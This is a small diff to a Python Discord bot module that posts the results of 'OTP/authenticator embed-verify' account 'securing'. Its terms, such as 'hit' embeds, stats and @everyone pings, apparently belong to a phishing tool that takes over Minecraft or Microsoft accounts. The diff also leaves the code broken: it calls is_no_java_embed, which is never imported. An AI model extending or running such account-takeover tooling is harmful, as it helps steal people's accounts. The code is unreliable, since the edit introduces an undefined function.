@@ -1,8 +1,8 @@
 from discord import AllowedMentions, Embed, Interaction, abc
 import logging
 
-from authsecuring.account_filters import is_embed_verify_no_minecraft
-from authsecuring.build_embeds import public_secure_reason
+from authsecuring.filters import is_embed_verify_no_minecraft
+from authsecuring.embed_builder import public_secure_reason
 from tools.embeds import verify_embed
 from tools.send_logs import send_logs, build_log_embed
 from tools.post_verification import after_verify
@@ -98,7 +98,7 @@ async def publish_embed_secure_result(
 ) -> bool:
     """Post OTP/authenticator embed-verify results. Returns True on real success.
 
-    startSecuringAccount returns a truthy dict on login/filter failures
+    romeo_secure returns a truthy dict on login/filter failures
     (``failed=True``, often without ``details``). Treating that as success
     pinged @everyone then crashed on missing stats_embed.
     """
@@ -152,7 +152,7 @@ async def publish_embed_secure_result(
     details = secured_account.get("details") or {}
     hit_embed = secured_account.get("hit_embed")
     stats_embed = details.get("stats_embed") if isinstance(details, dict) else None
-    no_mc = is_embed_verify_no_minecraft(secured_account)
+    no_mc = is_no_java_embed(secured_account)
 
     if no_mc:
         log.warning(
